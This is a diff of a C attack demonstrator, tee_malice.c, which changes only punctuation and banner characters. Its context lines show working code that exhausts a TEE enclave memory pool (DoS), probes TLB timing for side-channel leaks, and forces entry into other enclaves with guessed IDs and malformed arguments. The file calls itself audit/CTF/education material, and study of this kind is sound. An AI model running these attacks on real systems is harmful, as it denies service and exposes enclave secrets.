@@ -1,17 +1,17 @@
-/* tee_malice.c — TEE enclave interface abuse demonstrations
+/* tee_malice.c -- TEE enclave interface abuse demonstrations
  *
  * Illustrates security risks of an unprotected /dev/tee_enclave:
  *
- *   A. AVAILABILITY — Resource exhaustion
+ *   A. AVAILABILITY -- Resource exhaustion
  *      Repeatedly creates enclaves until the memory pool is exhausted,
  *      denying service to legitimate users.
  *
- *   B. CONFIDENTIALITY — Memory probing via side channel
+ *   B. CONFIDENTIALITY -- Memory probing via side channel
  *      Measures access latency to detect which pages belong to an enclave,
  *      exploiting TLB state that may persist across mdid boundaries if
  *      mfence.did is not called on every domain switch.
  *
- *   C. INTEGRITY — Payload injection
+ *   C. INTEGRITY -- Payload injection
  *      Attempts to enter someone else's enclave with a crafted payload,
  *      or sends malformed arguments to trigger edge cases in the SBI handler.
  *
@@ -52,7 +52,7 @@ static void die(const char *msg) {
 	} while (0)
 
 /* ================================================================
- *  A. AVAILABILITY ATTACK — Enclave memory pool exhaustion
+ *  A. AVAILABILITY ATTACK -- Enclave memory pool exhaustion
  *
  *  The firmware allocates 2 MiB per enclave from a fixed pool.
  *  Repeated CREATE + never release consumes all slots and all memory,
@@ -70,13 +70,13 @@ static int attack_exhaust_pool(int max_slots) {
 
 	fd_local = open(TEE_DEVICE_PATH, O_RDWR);
 	if (fd_local < 0) {
-		LOG("open failed — driver not loaded?");
+		LOG("open failed -- driver not loaded?");
 		return -1;
 	}
 
 	/* Snapshot before */
 	if (ioctl(fd_local, TEE_IOC_GET_MEM, &before) < 0) {
-		LOG("GET_MEM failed (errno=%d) — SBI ext missing?", errno);
+		LOG("GET_MEM failed (errno=%d) -- SBI ext missing?", errno);
 		close(fd_local);
 		return -1;
 	}
@@ -85,7 +85,7 @@ static int attack_exhaust_pool(int max_slots) {
 		(unsigned long long)before.max_contiguous);
 
 	if (before.free_total == 0) {
-		LOG("Pool already exhausted — another attacker beat us?");
+		LOG("Pool already exhausted -- another attacker beat us?");
 		close(fd_local);
 		return 0;
 	}
@@ -97,7 +97,7 @@ static int attack_exhaust_pool(int max_slots) {
          * and we return here.  We never SHUTDOWN, so the memory and
          * slot stay occupied. */
 		if (ioctl(fd_local, TEE_IOC_CREATE, 0) < 0) {
-			LOG("CREATE #%d failed (errno=%d) — pool full?", i + 1, errno);
+			LOG("CREATE #%d failed (errno=%d) -- pool full?", i + 1, errno);
 			break;
 		}
 		created++;
@@ -114,13 +114,13 @@ static int attack_exhaust_pool(int max_slots) {
 		created);
 
 	if (after.free_total == 0) {
-		LOG("*** POOL EXHAUSTED — DoS successful ***");
+		LOG("*** POOL EXHAUSTED -- DoS successful ***");
 		LOG("*** Other programs cannot create enclaves ***");
 	} else if (created == 0) {
-		LOG("*** CREATE always failed — pool may be reserved ***");
+		LOG("*** CREATE always failed -- pool may be reserved ***");
 	}
 
-	/* Hold the fd open — slots stay occupied until SHUTDOWN or
+	/* Hold the fd open -- slots stay occupied until SHUTDOWN or
      * process exit (which triggers fd close, but the driver doesn't
      * auto-release enclave slots). */
 	LOG("Holding fd=%d open to keep slots occupied.", fd_local);
@@ -134,11 +134,11 @@ static int attack_exhaust_pool(int max_slots) {
 }
 
 /* ================================================================
- *  B. CONFIDENTIALITY ATTACK — TLB side-channel probing
+ *  B. CONFIDENTIALITY ATTACK -- TLB side-channel probing
  *
  *  After one enclave accesses secret data (TLB entries tagged with
  *  its mdid), a second enclave or the host can probe TLB access
- *  latency to infer which pages were accessed — a classic
+ *  latency to infer which pages were accessed -- a classic
  *  Prime+Probe or Flush+Reload attack across mdid domains.
  *
  *  This leverages rdcycle to measure access timing.  If mfence.did
@@ -146,7 +146,7 @@ static int attack_exhaust_pool(int max_slots) {
  *  leak cross-domain information.
  * ================================================================ */
 
-/* Read time CSR (rdcycle) — may trap to S-mode but the kernel
+/* Read time CSR (rdcycle) -- may trap to S-mode but the kernel
  * emulates it via scounteren. */
 static inline uint64_t rdcycle(void) {
 	uint64_t val;
@@ -208,14 +208,14 @@ static void attack_tlb_probe(void) {
 		}
 	}
 	if (suspect == 0) {
-		LOG("  (none — TLB may be clean)");
+		LOG("  (none -- TLB may be clean)");
 	} else {
 		LOG("*** %d suspicious cache lines detected ***", suspect);
 	}
 }
 
 /* ================================================================
- *  C. INTEGRITY ATTACK — Malformed payload / ID guessing
+ *  C. INTEGRITY ATTACK -- Malformed payload / ID guessing
  *
  *  Attempts to ENTER enclaves with garbage payload or incorrect IDs.
  *  With no authentication, any process can try to enter any enclave.
@@ -230,7 +230,7 @@ static void attack_integrity_probe(void) {
 
 	fd = open(TEE_DEVICE_PATH, O_RDWR);
 	if (fd < 0) {
-		LOG("open failed — driver not loaded?");
+		LOG("open failed -- driver not loaded?");
 		return;
 	}
 
@@ -251,8 +251,8 @@ static void attack_integrity_probe(void) {
 		rc				= ioctl(fd, TEE_IOC_ENTER, &args);
 		if (rc == 0) {
 			LOG("!!! ENTER enclave_id=%llu SUCCEEDED with garbage payload !!!", id);
-			LOG("!!! Integrity boundary VIOLATED — attacker entered enclave %llu", id);
-			/* We're now inside the enclave — back after SUSPEND from
+			LOG("!!! Integrity boundary VIOLATED -- attacker entered enclave %llu", id);
+			/* We're now inside the enclave -- back after SUSPEND from
              * the enclave runtime.  Shutdown to clean up. */
 			ioctl(fd, TEE_IOC_SHUTDOWN, 0);
 		} else if (errno == EINVAL) {
@@ -269,9 +269,9 @@ static void attack_integrity_probe(void) {
 	args.argv_ptr	= 0xFFFFFFDF00000000ULL; /* kernel VA range */
 	rc				= ioctl(fd, TEE_IOC_ENTER, &args);
 	if (rc == 0) {
-		LOG("!!! ENTER with kernel VA argv succeeded — possible info leak");
+		LOG("!!! ENTER with kernel VA argv succeeded -- possible info leak");
 	} else {
-		LOG("  ENTER with kernel VA: rejected (errno=%d) — expected", errno);
+		LOG("  ENTER with kernel VA: rejected (errno=%d) -- expected", errno);
 	}
 
 	close(fd);
@@ -279,25 +279,25 @@ static void attack_integrity_probe(void) {
 }
 
 /* ================================================================
- *  D. COMBINED — Run all attacks in sequence
+ *  D. COMBINED -- Run all attacks in sequence
  * ================================================================ */
 
 static void print_banner(void) {
-	printf("\n"
-		   "╔══════════════════════════════════════════════════╗\n"
-		   "║    TEE Enclave Interface — Abuse Demonstrator   ║\n"
-		   "║    For security audit / CTF / education only    ║\n"
-		   "╚══════════════════════════════════════════════════╝\n"
-		   "\n");
+	puts("\n"
+		 "+==================================================+\n"
+		 "|    TEE Enclave Interface - Abuse Demonstrator   |\n"
+		 "|    For security audit / CTF / education only    |\n"
+		 "+==================================================+\n"
+		 "");
 }
 
 static void print_usage(const char *prog) {
 	printf(
 		"Usage: %s <attack>\n"
-		"  avail    — memory pool exhaustion (DoS)\n"
-		"  conf     — TLB side-channel probe\n"
-		"  integ    — integrity boundary probing\n"
-		"  all      — run all attacks\n",
+		"  avail    -- memory pool exhaustion (DoS)\n"
+		"  conf     -- TLB side-channel probe\n"
+		"  integ    -- integrity boundary probing\n"
+		"  all      -- run all attacks\n",
 		prog);
 }
 
